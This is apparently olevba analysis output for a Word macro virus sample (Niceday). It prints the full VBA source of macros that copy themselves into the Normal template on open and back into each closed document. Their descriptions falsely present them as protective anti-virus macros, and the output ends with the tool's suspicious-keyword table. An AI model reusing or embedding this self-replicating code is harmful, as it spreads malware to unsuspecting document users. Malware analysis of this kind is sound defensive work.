olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PayLoad.bas 
in file: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216 - OLE stream: 'Macros/VBA/PayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' (c) CYBEC Pty Ltd 1996
' Global:PayLoad macro
' Protects system against reinfection

Public Sub MAIN()
Attribute MAIN.VB_Description = "Null macro to prevent prank macros from re-installing.  Do not delete."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.PayLoad.MAIN"
Rem Existance of the PayLoad macro protects against the Winword.Concept REM infection!!!
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216 - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem Concept3.AutoExit.Macro
Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExit.MAIN"
Dim message1$
Dim daynumber
Dim monthnumber
message1$ = "Have a Nice Day !"

daynumber = WordBasic.Day(WordBasic.Now())
monthnumber = WordBasic.Month(WordBasic.Now())

If daynumber = 1 And monthnumber = 4 Then WordBasic.MsgBox message1$ Else WordBasic.MsgBox message1$

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Checks Page Size; if not default Page Size, converts document to default Page Size.  FWTMPv61"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.VOpen.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort
    
            vZap$ = WordBasic.[FileName$]()

            vMacro$ = vZap$ + ":Payload"
            WordBasic.MacroCopy vMacro$, "Global:PayLoad"

            vMacro$ = vZap$ + ":AutoExit"
            WordBasic.MacroCopy vMacro$, "Global:AutoExit"

            vMacro$ = vZap$ + ":AutoOpen"
            WordBasic.MacroCopy vMacro$, "Global:VOpen"

            vMacro$ = vZap$ + ":VClose"
            WordBasic.MacroCopy vMacro$, "Global:AutoClose"

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VClose.bas 
in file: Virus.MSWord.Niceday.o-375a4abd7488aa03612593d28a9740678a8c3216 - OLE stream: 'Macros/VBA/VClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoClose.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort

        WordBasic.FileSaveAs Format:=1

        vZap$ = WordBasic.[FileName$]()

        vMacro$ = vZap$ + ":Payload"
        WordBasic.MacroCopy "Global:PayLoad", vMacro$

        vMacro$ = vZap$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", vMacro$

        vMacro$ = vZap$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:VOpen", vMacro$

        vMacro$ = vZap$ + ":VClose"
        WordBasic.MacroCopy "Global:AutoClose", vMacro$

        WordBasic.FileSaveAs Format:=1

Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

